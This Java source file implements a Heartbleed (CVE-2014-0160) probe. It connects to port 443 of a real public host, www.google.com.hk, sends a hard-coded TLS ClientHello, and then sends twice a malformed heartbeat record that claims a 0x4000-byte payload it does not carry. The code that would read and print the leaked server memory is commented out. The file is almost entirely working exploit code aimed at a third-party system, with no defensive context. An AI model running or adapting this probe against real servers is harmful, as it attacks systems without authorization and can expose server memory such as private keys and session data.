package org.leo.ssl;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;

import org.apache.commons.codec.DecoderException;
import org.apache.commons.codec.binary.Hex;

public class HeartbleedTest {
	
	private static String helloHex = "16030200dc010000d8030253435b909d9b720bbc0cbc2b92a84897cfbd3904cc160a8503909f770433d4de000066c014c00ac022c0210039003800880087c00fc00500350084c012c008c01cc01b00160013c00dc003000ac013c009c01fc01e00330032009a009900450044c00ec004002f00960041c011c007c00cc002000500040015001200090014001100080006000300ff01000049000b000403000102000a00340032000e000d0019000b000c00180009000a00160017000800060007001400150004000500120013000100020003000f0010001100230000000f000101";
	private static String hbHex = "1803020003014000";
				
	public static void main(String[] args) throws DecoderException, InterruptedException {
		Socket socket = null;
		try {
			String host = "www.google.com.hk";
			int port = 443;
			socket = new Socket(host, port);
			//向服务器端第一次发送字符串   
			OutputStream netOut = socket.getOutputStream();
			DataInputStream in = new DataInputStream(socket.getInputStream());
			
			System.out.println("Sending Client Hello...");
			netOut.write(Hex.decodeHex(helloHex.toCharArray()));
			
			System.out.println("Waiting for Server Hello...");
			//Thread.sleep(2000);
			/**
			byte[] shArr = new byte[in.read()];
			in.readFully(shArr);
			System.out.println(new String(shArr));
			*/
			
			System.out.println("Sending heartbeat request...");
			netOut.write(Hex.decodeHex(hbHex.toCharArray()));
			netOut.write(Hex.decodeHex(hbHex.toCharArray()));
			/**
			shArr = new byte[in.read()];
			in.readFully(shArr);
			System.out.println(new String(shArr));
			*/
			netOut.close();
			in.close();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			if (socket != null) {
				try {
					socket.close();
				} catch (IOException e) {
				}
			}
		}
	}
}
